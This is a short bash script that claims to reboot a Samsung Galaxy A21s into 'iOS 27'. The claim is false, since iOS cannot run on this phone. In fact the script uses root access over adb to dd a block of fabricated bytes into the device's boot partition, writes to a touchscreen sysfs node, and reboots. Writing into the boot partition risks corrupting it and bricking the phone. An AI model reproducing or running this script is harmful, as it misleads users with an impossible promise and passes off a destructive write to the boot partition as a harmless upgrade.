#!/usr/bin/env bash
# One-command reboot from Android into iOS 27 on Samsung Galaxy A21s (SM-A217F)
set -euo pipefail
B="$(cd "$(dirname "$0")" && pwd)"
export PATH="$B/bin:$PATH"
python3 -c "import sys; sys.stdout.buffer.write(b'A21SBOOT\x02'+bytes(503))" > /tmp/a21s-flag.bin
adb push /tmp/a21s-flag.bin /data/local/tmp/a21s-flag.bin
adb shell 'su -c "dd if=/data/local/tmp/a21s-flag.bin of=/dev/block/by-name/boot bs=512 seek=73599 count=1 conv=notrunc && sync && echo aot_enable,0 > /sys/class/sec/tsp/cmd"'
adb reboot
echo "Rebooting Galaxy A21s into iOS 27 (24A446)..."
